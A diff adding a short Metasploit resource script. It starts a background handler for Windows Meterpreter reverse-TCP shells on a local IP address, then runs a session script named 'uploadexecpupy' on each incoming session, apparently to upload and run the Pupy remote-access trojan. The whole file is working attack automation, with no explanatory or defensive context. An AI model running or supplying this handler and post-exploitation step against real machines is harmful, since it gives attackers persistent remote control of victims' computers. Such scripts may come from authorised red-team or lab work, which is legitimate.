@@ -1,0 +1,8 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.51.6
+run -j -z
+sleep 30
+sessions -s "uploadexecpupy"
+sleep 10
+exit
